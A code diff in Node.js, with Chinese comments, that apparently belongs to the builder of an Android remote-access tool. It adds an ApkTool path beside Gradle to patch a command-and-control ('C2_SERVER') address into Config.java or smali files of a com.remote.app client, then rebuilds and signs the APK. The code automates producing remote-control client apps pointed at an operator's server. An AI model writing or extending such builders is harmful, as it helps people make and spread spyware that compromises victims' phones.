@@ -5,6 +5,19 @@ const
     CONST = require('./const');
 
 /**
+ * 检查Java是否已安装
+ */
+function checkJava(callback) {
+    let spawn = cp.spawn('java', ['-version']);
+    spawn.on('error', (err) => callback("Java未安装", null));
+    spawn.stderr.on('data', (data) => {
+        spawn.removeAllListeners();
+        spawn.stderr.removeAllListeners();
+        return callback(null, "Java已安装");
+    });
+}
+
+/**
  * 获取Android SDK路径
  * 支持多种常见安装位置
  */
@@ -37,12 +50,115 @@ function getAndroidSdkPath() {
 }
 
 /**
- * 设置local.properties中的SDK路径
+ * 检查是否可以使用ApkTool方案（无需Android SDK）
+ */
+function canUseApkTool() {
+    return fs.existsSync(CONST.apkTool) && 
+           fs.existsSync(CONST.smaliPath);
+}
+
+/**
+ * 使用ApkTool修改smali文件中的服务器地址（无需Android SDK）
+ * @param {string} URI - 服务器地址
+ * @param {string} PORT - 服务器端口
+ * @param {function} cb - 回调函数
+ */
+function patchApkTool(URI, PORT, cb) {
+    // 首先尝试Config.smali（新版代码结构）
+    const configSmaliPath = path.join(CONST.smaliPath, '/smali/com/remote/app/Config.smali');
+    const iosocketSmaliPath = CONST.patchFilePath;
+    
+    let targetFile = null;
+    let patchPattern = null;
+    
+    // 检测使用哪个文件
+    if (fs.existsSync(configSmaliPath)) {
+        targetFile = configSmaliPath;
+        // Config.smali中的模式：const-string v0, "http://..."
+        patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
+    } else if (fs.existsSync(iosocketSmaliPath)) {
+        targetFile = iosocketSmaliPath;
+        // IOSocket.smali中的旧模式
+        patchPattern = /http:\/\/[^"?]+(?::\d+)?/;
+    } else {
+        // 搜索任何包含http://的smali文件
+        return cb('未找到可修补的smali文件，请确保decompiled目录存在');
+    }
+    
+    fs.readFile(targetFile, 'utf8', function (err, data) {
+        if (err) return cb('读取smali文件失败: ' + err.message);
+        
+        const serverUrl = `http://${URI}:${PORT}`;
+        
+        let result;
+        if (targetFile.includes('Config.smali')) {
+            // 新版模式：替换const-string
+            result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
+        } else {
+            // 旧版模式：直接替换URL
+            result = data.replace(patchPattern, serverUrl);
+        }
+        
+        // 检查是否真的替换了
+        if (result === data) {
+            return cb('未能在smali文件中找到服务器地址模式');
+        }
+        
+        fs.writeFile(targetFile, result, 'utf8', function (err) {
+            if (err) return cb('写入smali文件失败: ' + err.message);
+            console.log('已修补smali文件:', targetFile);
+            return cb(false);
+        });
+    });
+}
+
+/**
+ * 使用ApkTool构建APK（无需Android SDK）
+ * @param {function} cb - 回调函数
+ */
+function buildWithApkTool(cb) {
+    checkJava(function (err) {
+        if (err) return cb(err);
+        
+        console.log('使用ApkTool方案构建（无需Android SDK）...');
+        
+        // 执行ApkTool构建
+        cp.exec(CONST.apktoolBuildCommand, { timeout: 300000 }, (error, stdout, stderr) => {
+            if (error) {
+                console.log('ApkTool构建输出:', stdout);
+                console.log('ApkTool构建错误:', stderr);
+                return cb('ApkTool构建失败: ' + error.message);
+            }
+            
+            console.log('ApkTool构建成功');
+            
+            // 检查APK是否存在
+            if (!fs.existsSync(CONST.apkBuildPath)) {
+                return cb('未找到构建的APK文件: ' + CONST.apkBuildPath);
+            }
+            
+            // 签名APK
+            cp.exec(CONST.apktoolSignCommand, (signError, signStdout, signStderr) => {
+                if (signError) {
+                    console.log('签名输出:', signStdout);
+                    console.log('签名错误:', signStderr);
+                    return cb('APK签名失败: ' + signError.message);
+                }
+                
+                console.log('APK签名成功');
+                return cb(false);
+            });
+        });
+    });
+}
+
+/**
+ * 设置local.properties中的SDK路径（Gradle方案）
  */
 function setupLocalProperties(cb) {
     const sdkPath = getAndroidSdkPath();
     if (!sdkPath) {
-        return cb('未找到Android SDK，请设置ANDROID_HOME环境变量或安装Android SDK');
+        return cb('未找到Android SDK');
     }
     
     const localPropertiesPath = path.join(CONST.clientPath, 'local.properties');
@@ -58,20 +174,7 @@ sdk.dir=${sdkPath}
 }
 
 /**
- * 检查Java是否已安装
- */
-function checkJava(callback) {
-    let spawn = cp.spawn('java', ['-version']);
-    spawn.on('error', (err) => callback("Java未安装", null));
-    spawn.stderr.on('data', (data) => {
-        spawn.removeAllListeners();
-        spawn.stderr.removeAllListeners();
-        return callback(null, "Java已安装");
-    });
-}
-
-/**
- * 修改Config.java中的C2服务器地址
+ * 修改Config.java中的C2服务器地址（Gradle方案）
  * @param {string} URI - 服务器地址
  * @param {string} PORT - 服务器端口
  * @param {function} cb - 回调函数
@@ -80,11 +183,9 @@ function patchConfig(URI, PORT, cb) {
     fs.readFile(CONST.configFilePath, 'utf8', function (err, data) {
         if (err) return cb('读取Config.java失败: ' + err.message);
         
-        // 构建新的服务器URL
         const serverUrl = `http://${URI}:${PORT}`;
         
         // 替换C2_SERVER的值
-        // 匹配 public static String C2_SERVER = "...";
         const pattern = /public static String C2_SERVER\s*=\s*"[^"]*";/;
         const replacement = `public static String C2_SERVER = "${serverUrl}";`;
         
@@ -102,42 +203,23 @@ function patchConfig(URI, PORT, cb) {
 }
 
 /**
- * 完整的APK构建流程
- * @param {string} URI - 服务器地址
- * @param {string} PORT - 服务器端口
+ * 使用Gradle构建APK（需要Android SDK）
  * @param {function} cb - 回调函数
  */
-function buildAPKFull(URI, PORT, cb) {
-    // 第一步：设置SDK路径
-    setupLocalProperties((err) => {
-        if (err) return cb(err);
-        
-        // 第二步：修改服务器地址
-        patchConfig(URI, PORT, (err) => {
-            if (err) return cb(err);
-            
-            // 第三步：执行构建
-            buildAPK(cb);
-        });
-    });
-}
-
-/**
- * 使用Gradle构建Release APK
- * @param {function} cb - 回调函数
- */
-function buildAPK(cb) {
+function buildWithGradle(cb) {
     checkJava(function (err) {
         if (err) return cb(err);
         
         const sdkPath = getAndroidSdkPath();
         if (!sdkPath) {
-            return cb('未找到Android SDK，请设置ANDROID_HOME环境变量');
+            return cb('未找到Android SDK，无法使用Gradle方案');
         }
+        
+        console.log('使用Gradle方案构建（需要Android SDK）...');
         
         const options = {
             cwd: CONST.clientPath,
-            timeout: 300000, // 5分钟超时
+            timeout: 300000,
             env: {
                 ...process.env,
                 ANDROID_HOME: sdkPath,
@@ -145,8 +227,7 @@ function buildAPK(cb) {
             }
         };
         
-        // 执行Gradle构建
-        cp.exec(CONST.buildCommand, options, (error, stdout, stderr) => {
+        cp.exec(CONST.gradleBuildCommand, options, (error, stdout, stderr) => {
             if (error) {
                 console.log('Gradle构建输出:', stdout);
                 console.log('Gradle构建错误:', stderr);
@@ -155,13 +236,11 @@ function buildAPK(cb) {
             
             console.log('Gradle构建成功');
             
-            // 检查未签名APK是否存在
             if (!fs.existsSync(CONST.apkUnsignedPath)) {
                 return cb('未找到构建的APK文件: ' + CONST.apkUnsignedPath);
             }
             
-            // 签名APK
-            cp.exec(CONST.signCommand, (signError, signStdout, signStderr) => {
+            cp.exec(CONST.gradleSignCommand, (signError, signStdout, signStderr) => {
                 if (signError) {
                     console.log('签名输出:', signStdout);
                     console.log('签名错误:', signStderr);
@@ -170,10 +249,8 @@ function buildAPK(cb) {
                 
                 // 重命名签名后的APK
                 const signedApkPath = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
-                const finalPath = CONST.apkSignedBuildPath;
-                
                 if (fs.existsSync(signedApkPath)) {
-                    fs.renameSync(signedApkPath, finalPath);
+                    fs.renameSync(signedApkPath, CONST.apkSignedBuildPath);
                 }
                 
                 return cb(false);
@@ -183,26 +260,95 @@ function buildAPK(cb) {
 }
 
 /**
+ * 智能构建APK - 自动选择最佳方案
+ * @param {string} URI - 服务器地址
+ * @param {string} PORT - 服务器端口
+ * @param {function} cb - 回调函数
+ */
+function buildAPK(URI, PORT, cb) {
+    // 判断使用哪种方案
+    const hasAndroidSdk = getAndroidSdkPath() !== null;
+    const hasApkTool = canUseApkTool();
+    
+    console.log('构建方案检测:');
+    console.log('  - Android SDK:', hasAndroidSdk ? '存在' : '不存在');
+    console.log('  - ApkTool:', hasApkTool ? '存在' : '不存在');
+    
+    if (hasAndroidSdk) {
+        // 优先使用Gradle方案（更现代，支持Android 14）
+        console.log('选择: Gradle方案（推荐，支持Android 14）');
+        setupLocalProperties((err) => {
+            if (err) {
+                // Gradle设置失败，回退到ApkTool
+                if (hasApkTool) {
+                    console.log('Gradle设置失败，回退到ApkTool方案...');
+                    return buildApkToolFull(URI, PORT, cb);
+                }
+                return cb(err);
+            }
+            
+            patchConfig(URI, PORT, (err) => {
+                if (err) {
+                    if (hasApkTool) {
+                        console.log('Config.java修补失败，回退到ApkTool方案...');
+                        return buildApkToolFull(URI, PORT, cb);
+                    }
+                    return cb(err);
+                }
+                
+                buildWithGradle(cb);
+            });
+        });
+    } else if (hasApkTool) {
+        // 使用ApkTool方案
+        console.log('选择: ApkTool方案（无需Android SDK）');
+        buildApkToolFull(URI, PORT, cb);
+    } else {
+        return cb('未找到可用的构建方案。请安装Android SDK（用于Gradle方案）或确保apktool.jar和decompiled目录存在（用于ApkTool方案）');
+    }
+}
+
+/**
+ * 完整的ApkTool构建流程
+ */
+function buildApkToolFull(URI, PORT, cb) {
+    patchApkTool(URI, PORT, (err) => {
+        if (err) return cb(err);
+        buildWithApkTool(cb);
+    });
+}
+
+/**
  * 清理构建缓存
  */
 function cleanBuild(cb) {
-    const options = {
-        cwd: CONST.clientPath,
-        timeout: 60000
-    };
+    // 清理Gradle
+    if (fs.existsSync(CONST.gradlePath)) {
+        const options = {
+            cwd: CONST.clientPath,
+            timeout: 60000
+        };
+        cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
+            if (error) console.log('Gradle清理警告:', error.message);
+        });
+    }
     
-    cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
-        if (error) return cb('清理失败: ' + error.message);
-        return cb(false);
-    });
+    // 清理ApkTool输出
+    if (fs.existsSync(CONST.apkBuildPath)) {
+        fs.unlinkSync(CONST.apkBuildPath);
+    }
+    
+    return cb(false);
 }
 
 module.exports = {
     buildAPK,
     patchConfig,
+    patchApkTool,
     cleanBuild,
-    buildAPKFull,
     getAndroidSdkPath,
+    canUseApkTool,
     // 保持向后兼容
-    patchAPK: patchConfig
+    patchAPK: patchConfig,
+    buildAPKFull: buildAPK
 };
